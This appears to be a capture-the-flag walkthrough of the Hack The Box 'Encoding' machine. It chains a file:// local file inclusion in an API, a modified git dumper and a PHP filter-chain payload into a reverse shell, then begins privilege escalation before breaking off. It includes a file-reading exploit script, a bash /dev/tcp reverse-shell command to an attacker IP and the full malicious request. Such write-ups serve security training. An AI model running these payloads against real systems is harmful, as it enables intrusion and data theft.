- Add the relevant endpoint to `/etc/hosts`

```bash
echo "10.10.11.198	encoding.htb" | sudo tee -a /etc/hosts
```

- Start recon in the background with `autorecon`

```bash
sudo (which autorecon) encoding.htb
```

- We see immediately that there is a web-server on port 80`.
- We visit:
	- [[http://encoding.htb/index.php?page=api]]
		- We can see that the `API` is explaining how to use it via `python`

```python
import requests

json_data = {
    'action': 'str2hex',
    'file_url' : 'http://example.com/data.txt'
}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
print(response.text)
```

- Add this to your `/etc/hosts`:

```bash
echo "10.10.11.198	api.haxtables.htb" | sudo tee -a /etc/hosts
```

- After some trial and error and failing with attempts to achieve `LFI` we check out the `autorecon` output for port `80`.
- We can see there is some `php` action going on.

```bash
cat tcp_80_http_feroxbuster_dirbuster.txt | grep 200
200      GET       31l       80w     1019c http://encoding.htb/assets/js/main.js
200      GET      167l      329w     3025c http://encoding.htb/assets/css/main.css
200      GET     2206l    13654w   619037c http://encoding.htb/assets/img/index.png
200      GET       48l      137w        0c http://encoding.htb/index.php
200      GET       48l      137w        0c http://encoding.htb/
200      GET       18l       82w     1303c http://encoding.htb/assets/
200      GET        1l        2w        0c http://encoding.htb/handler.php
200      GET        5l       53w      375c http://encoding.htb/includes/
```

- With this detail we can test a php file wrapper `LFI` i.e `file://` with success!
- Here is a python script to decode the relevant data.
	- We also proxy the traffic in case we want to use it in our `Burp` instance.

```python
import requests, sys, json, base64
if len(sys.argv) < 2:
    print("Use: python show_file.py <filename>")
    sys.exit(1)

proxy = {
    'http': 'http://127.0.0.1:8081'
}

json_data = {
    'action': 'b64encode',
    'file_url' : f'file://{sys.argv[1]}'
    }

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', proxies=proxy, json=json_data)

json = json.loads(response.text)
string = json['data']
base64_decode = base64.b64decode(string)
message = base64_decode.decode('ascii')
print(message)
```

- Here is the output in `Burp`.
- Note this method still requires us to decode it from `base64`.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230309052813.png)

- Using the script will assist with this:

```bash
python show_file.py /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
svc:x:1000:1000:svc:/home/svc:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

- Here is the `/etc/hosts` file which indicates another endpoint we were unaware of i.e. `image.haxtables.htb`

```bash
python show_file.py /etc/hosts

127.0.0.1 localhost
127.0.1.1 encoding
127.0.0.1 haxtables.htb api.haxtables.htb image.haxtables.htb

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

- Let's add it to our `/etc/hosts` file:

```bash
echo "10.10.11.198	image.haxtables.htb" | sudo tee -a /etc/hosts
```

- In `wappalyzer` we can see that an `Apache HTTP Server` is running.
![image](https://0xc0rvu5.github.io/docs/assets/images/20230309090516.png)

- Here is the `/etc/apache2/sites-enabled/000-default.conf` output

```bash
python show_file.py /etc/apache2/sites-enabled/000-default.conf

<VirtualHost *:80>
	ServerName haxtables.htb
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html


	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>


<VirtualHost *:80>
	ServerName api.haxtables.htb
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/api
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
        ServerName image.haxtables.htb
        ServerAdmin webmaster@localhost
        
	DocumentRoot /var/www/image

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
	#SecRuleEngine On

	<LocationMatch />
  		SecAction initcol:ip=%{REMOTE_ADDR},pass,nolog,id:'200001'
  		SecAction "phase:5,deprecatevar:ip.somepathcounter=1/1,pass,nolog,id:'200002'"
  		SecRule IP:SOMEPATHCOUNTER "@gt 5" "phase:2,pause:300,deny,status:509,setenv:RATELIMITED,skip:1,nolog,id:'200003'"
  		SecAction "phase:2,pass,setvar:ip.somepathcounter=+1,nolog,id:'200004'"
  		Header always set Retry-After "10" env=RATELIMITED
	</LocationMatch>

	ErrorDocument 429 "Rate Limit Exceeded"

        <Directory /var/www/image>
                Deny from all
                Allow from 127.0.0.1
                Options Indexes FollowSymLinks
                AllowOverride All
                Require all granted
        </DIrectory>

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

- Let's check out the default `index.php` file within the root directory of `/var/www/image`:

```bash
python show_file.py /var/www/image/index.php

<?php 

include_once 'utils.php';

include 'includes/coming_soon.html';

?>

```

- This presents us with the `/var/www/image/utils.php` file:

```bash
python show_file.py /var/www/image/utils.php

<?php

// Global functions

function jsonify($body, $code = null)
{
    if ($code) {
        http_response_code($code);
    }

    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($body);

    exit;
}

function get_url_content($url)
{
    $domain = parse_url($url, PHP_URL_HOST);
    if (gethostbyname($domain) === "127.0.0.1") {
        echo jsonify(["message" => "Unacceptable URL"]);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);
    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    $url_content =  curl_exec($ch);
    curl_close($ch);
    return $url_content;

}

function git_status()
{
    $status = shell_exec('cd /var/www/image && /usr/bin/git status');
    return $status;
}

function git_log($file)
{
    $log = shell_exec('cd /var/www/image && /ust/bin/git log --oneline "' . addslashes($file) . '"');
    return $log;
}

function git_commit()
{
    $commit = shell_exec('sudo -u svc /var/www/image/scripts/git-commit.sh');
    return $commit;
}
?>
```

- We can see within `utils.php` that the `$domain` variable will only be accessible as `localhost`.
- We can also see that there is some sort of `git` repository is within the `/var/wwww/image` directory.
- Let's use the following script to dump the relevant data from this directory.

#### `gitdumper.sh`
- [[https://github.com/internetwache/GitTools/tree/master/Dumper]]

```bash
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh

chmod 700 gitdumper.sh
```

- In order to emulate `LFI` instead of `RFI` we will have to make the proper changes to `gitdumper.sh`:

```bash
 113   │     #Download file
 114   │     curl -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrom
       │ e/55.0.2883.87 Safari/537.36" -f -k -s "$url" -o "$target"
```
- to

```bash
 113   │     #Download file
 114   │     curl -s 'http://api.haxtables.htb/v3/tools/string/index.php' -H 'Content-Type: application/json' -
       │ -data-binary "{\"action\": \"str2hex\", \"file_url\": \"file:///var/www/image/.git/$objname\"}" | jq .
       │ data | xxd -ps -r > "$target"
```

-   `| jq .data` - This pipes the output of the previous command to `jq`, which is used to extract the `data` field from the JSON response returned by the API. The `.` refers to the root of the JSON document and `data` is the name of the field to be extracted.
-   `| xxd -ps -r > "$target"`- This pipes the output of the `jq` command to `xxd`, which is used to convert the hexadecimal output to binary. The `-ps` option specifies that the input is in plain hexadecimal format, and the `-r` option specifies that the output should be in binary format. The resulting binary data is redirected to a file whose name is specified by the `$target` variable.

```bash
./gitdumper.sh 'http://encoding.htb/images/.git/' git
```


![image](https://0xc0rvu5.github.io/docs/assets/images/20230309070714.png)

![[Pasted image 20230309071540.png]]

- Next we will try to recover the incomplete git repository.

#### `extractor.sh`
- [[https://github.com/internetwache/GitTools/tree/master/Extractor]]

```bash
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Extractor/extractor.sh

chmod 700 extractor.sh

./Scripts/extractor.sh git/ extracted
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230309071728.png)


#### `LFI` due to no sanitation.

```bash
cat action_handler.php

<?php

include_once 'utils.php';

if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page);

} else {
    echo jsonify(['message' => 'No page specified!']);
}

?>
```

#### Same output at `encoding.htb/handler.php`

![image](https://0xc0rvu5.github.io/docs/assets/images/20230309072607.png)
 
- Let's retrieve that file with the current `LFI` exploit

```bash
python show_file.py /var/www/html/handler.php

<?php
include_once '../api/utils.php';

if (isset($_FILES['data_file'])) {
    $is_file = true;
    $action = $_POST['action'];
    $uri_path = $_POST['uri_path'];
    $data = $_FILES['data_file']['tmp_name'];

} else {
    $is_file = false;
    $jsondata = json_decode(file_get_contents('php://input'), true);
    $action = $jsondata['action'];
    $data = $jsondata['data'];
    $uri_path = $jsondata['uri_path'];



    if ( empty($jsondata) || !array_key_exists('action', $jsondata) || !array_key_exists('uri_path', $jsondata)) 
    {
        echo jsonify(['message' => 'Insufficient parameters!']);
        // echo jsonify(['message' => file_get_contents('php://input')]);

    }

}

$response = make_api_call($action, $data, $uri_path, $is_file);
echo $response;

?>
```


#### We will supply the relevant fields and check for `/etc/passwd` as a `PoC`.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230309074536.png)

- Success!
- Create `php` chain filter
	- [[https://github.com/synacktiv/php_filter_chain_generator]]

```bash
python php_filter_chain_generator.py --chain "<?php system('bash -c \"exec bash -i &>/dev/tcp/10.10.16.41/4444 <&1\"')?>"
```

create a listener

```bash
nc -lvnp 4444
```

execute

```Bash
GET /handler.php HTTP/1.1
Host: encoding.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 14636

{
  "action": "",
  "data": "",
  "uri_path": "test@image.haxtables.htb/actions/action_handler.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base6
51ff2ee7efd2ef60496bd3575e130d924-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
}
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230309093207.png)

- Running `sudo -l` immediately presents us with `(svc) NOPASSWD: /var/www/image/scripts/git-commit.sh`.

```bash
sudo -l

Matching Defaults entries for www-data on encoding:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

